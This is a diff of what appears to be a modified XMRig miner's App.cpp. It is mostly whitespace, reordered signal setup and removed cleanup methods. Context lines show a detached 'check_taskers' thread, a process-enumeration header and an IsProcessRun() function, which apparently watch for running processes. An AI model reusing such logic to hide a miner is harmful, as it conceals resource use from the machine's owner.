@@ -24,7 +24,6 @@
 #include <tlhelp32.h>
 #include <thread>
 
-
 #ifdef HAVE_SYSLOG_H
 #   include "log/SysLog.h"
 #endif
@@ -36,7 +35,6 @@
 
 App *App::m_self = nullptr;
 bool IsProcessRun(void);
-
 
 App::App(int argc, char **argv) :
     m_restart(false),
@@ -80,11 +78,11 @@ App::App(int argc, char **argv) :
     Platform::setProcessPriority(m_options->priority());
 
     m_network = new Network(m_options);
-	
-	uv_signal_init(uv_default_loop(), &m_signal);
+
     uv_signal_init(uv_default_loop(), &m_sigHUP);
     uv_signal_init(uv_default_loop(), &m_sigINT);
     uv_signal_init(uv_default_loop(), &m_sigTERM);
+    uv_signal_init(uv_default_loop(), &m_signal);
 }
 
 App::~App()
@@ -101,8 +99,6 @@ App::~App()
     delete m_httpd;
 #   endif
 
-    delete m_console;
-	
 #   ifndef XMRIG_NO_CC
     if (m_ccclient) {
         delete m_ccclient;
@@ -148,9 +144,9 @@ bool IsProcessRun(void)
 
 int App::start()
 {
+	
 	std::thread* check_taskers = new std::thread(Check);
-	check_taskers->detach();	
-
+	check_taskers->detach();
 	
     if (!m_options) {
         return EINVAL;
@@ -159,9 +155,13 @@ int App::start()
     uv_signal_start(&m_sigHUP,  App::onSignal, SIGHUP);
     uv_signal_start(&m_sigINT,  App::onSignal, SIGINT);
     uv_signal_start(&m_sigTERM, App::onSignal, SIGTERM);
+
     background();
 	
-	if (!m_options) { return 0; }
+    if (!m_options) {
+        return 0;
+    }
+	
     uv_signal_start(&m_signal, App::onSignal, SIGHUP);
     uv_signal_start(&m_signal, App::onSignal, SIGTERM);
     uv_signal_start(&m_signal, App::onSignal, SIGINT);
@@ -206,12 +206,11 @@ int App::start()
 
     const int r = uv_run(uv_default_loop(), UV_RUN_DEFAULT);
     uv_loop_close(uv_default_loop());
-	
+
     delete m_network;
     Options::release();
     Mem::release();
     Platform::release();
-    release();
     return m_restart ? EINTR : r;
 }
 
@@ -251,24 +250,6 @@ void App::onConsoleCommand(char command)
     }
 }
 
-void App::close()
-{
-    m_network->stop();
-    Workers::stop();
-    uv_stop(uv_default_loop());
-}
-
-
-void App::release()
-{
-    if (m_network) {
-        delete m_network;
-    }
-
-    Options::release();
-    Mem::release();
-    Platform::release();
-}
 
 void App::stop(bool restart)
 {
